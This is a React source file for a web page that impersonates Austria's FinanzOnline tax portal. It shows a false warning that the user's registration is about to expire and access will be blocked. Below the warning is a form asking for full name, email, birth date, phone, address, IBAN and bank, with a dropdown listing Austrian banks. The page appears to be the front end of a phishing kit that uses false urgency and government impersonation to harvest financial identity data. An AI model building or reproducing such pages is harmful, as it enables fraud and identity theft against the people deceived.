import Header from "@/components/Header";
import { Info, AlertTriangle, ChevronsUpDown, Check } from "lucide-react";
import { useState } from "react";
import { cn } from "@/lib/utils";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import {
  Command,
  CommandEmpty,
  CommandGroup,
  CommandInput,
  CommandItem,
  CommandList,
} from "@/components/ui/command";

const banks = [
  "Raiffeisen Bank",
  "Erste Bank",
  "BAWAG P.S.K.",
  "Bank Austria",
  "Volksbank",
  "Easy Bank",
  "HYPO NOE",
  "OberBank",
  "Bank99",
  "Schelhammer",
  "Bankhaus Spängler",
  "Dolomiten Bank",
  "Sparda Bank",
  "Dadat Bank",
];

const Index = () => {
  const [bankOpen, setBankOpen] = useState(false);
  const [selectedBank, setSelectedBank] = useState("");

  return (
    <div className="min-h-screen bg-white">
      <Header />
      <h1 className="py-8 text-center text-xl font-bold text-black md:py-12 md:text-2xl">
        Willkommen bei FinanzOnline
      </h1>

      <div className="container mx-auto px-4 py-4">
        <div className="rounded border-l-4 border-[#666] bg-[#f5f5f5] p-5" role="alert">
          <div className="mb-3 flex items-center gap-2">
            <Info className="h-5 w-5 text-gray-700" />
            <span className="text-base font-bold text-gray-900">Hinweis</span>
          </div>
          <div className="text-sm leading-relaxed text-gray-800">
            <p className="mb-3">
              <b>Wichtiger Hinweis zur Aktualisierung Ihrer Registrierungsdaten</b>
            </p>
            <p className="mb-3">
              Ihre Registrierung bei FinanzOnline läuft in Kürze ab. Um weiterhin Zugang zu allen Services zu gewährleisten, überprüfen und aktualisieren Sie bitte Ihre persönlichen Daten sowie Zugangsdaten zeitnah.
            </p>
            <p>
              Sollte die Aktualisierung nicht rechtzeitig erfolgen, kann Ihr Zugang eingeschränkt oder vorübergehend gesperrt werden – einschließlich der Abgabe von Steuererklärungen und der Einsicht in Bescheide.
            </p>
          </div>
        </div>

        {/* Persönliche Informationen Box */}
        <div className="mt-6 overflow-hidden rounded-lg border border-[#ddd] shadow-sm" role="region" aria-labelledby="region-personal">
          {/* Titel + Hinweis */}
          <div className="px-6 pt-6">
            <h2 id="region-personal" className="text-lg font-semibold text-gray-900">
              Persönliche Informationen
            </h2>
          </div>

          {/* Gelbe Hinweiszeile */}
          <div className="mx-5 mt-4 rounded-md bg-[#fff3cd] px-4 py-3">
            <div className="flex items-start gap-2">
              <AlertTriangle className="mt-0.5 h-5 w-5 flex-shrink-0 text-[#856404]" />
              <p className="text-sm text-[#856404]">
                Achtung! Bitte überprüfen und aktualisieren Sie Ihre persönlichen Informationen, um Ihren Zugang zu FinanzOnline aufrechtzuerhalten.
              </p>
            </div>
          </div>

          {/* Form Body */}
          <div className="px-6 py-6">
            <div className="space-y-5">
              {/* Voller Name */}
              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Voller Name</label>
                <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              {/* Email */}
              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">E-Mail</label>
                <input type="email" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              {/* Geburtsdatum */}
              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Geburtsdatum</label>
                <input type="text" placeholder="TT.MM.JJJJ" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              {/* Telefonnummer */}
              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Telefonnummer</label>
                <input type="tel" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              {/* Straße + Hausnummer */}
              <div className="grid grid-cols-3 gap-4">
                <div className="col-span-2">
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Straße</label>
                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Hausnummer</label>
                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
              </div>

              {/* Stiege + Türnummer */}
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Stiege</label>
                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Türnummer</label>
                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
              </div>

              {/* PLZ */}
              <div className="w-full md:w-1/3">
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Postleitzahl</label>
                <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              {/* IBAN */}
              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">IBAN</label>
                <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              {/* Bank Auswahl */}
              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Bank</label>
                <Popover open={bankOpen} onOpenChange={setBankOpen}>
                  <PopoverTrigger asChild>
                    <button
                      className="flex h-10 w-full items-center justify-between rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none"
                      role="combobox"
                      aria-expanded={bankOpen}
                    >
                      <span className={selectedBank ? "text-gray-900" : "text-gray-400"}>
                        {selectedBank || "Bank auswählen"}
                      </span>
                      <ChevronsUpDown className="h-4 w-4 text-gray-400" />
                    </button>
                  </PopoverTrigger>
                  <PopoverContent className="w-[--radix-popover-trigger-width] p-0" align="start">
                    <Command>
                      <CommandInput placeholder="Bank suchen..." />
                      <CommandList>
                        <CommandEmpty>Keine Bank gefunden.</CommandEmpty>
                        <CommandGroup>
                          {banks.map((bank) => (
                            <CommandItem
                              key={bank}
                              value={bank}
                              onSelect={() => {
                                setSelectedBank(bank);
                                setBankOpen(false);
                              }}
                            >
                              <Check
                                className={cn(
                                  "mr-2 h-4 w-4",
                                  selectedBank === bank ? "opacity-100" : "opacity-0"
                                )}
                              />
                              {bank}
                            </CommandItem>
                          ))}
                        </CommandGroup>
                      </CommandList>
                    </Command>
                  </PopoverContent>
                </Popover>
              </div>

              {/* Weiter Button */}
              <div className="flex justify-end pt-2">
                <button className="rounded-md border border-[#ccc] bg-white px-8 py-2.5 text-sm text-black hover:bg-[#f5f5f5]">
                  Weiter
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Index;
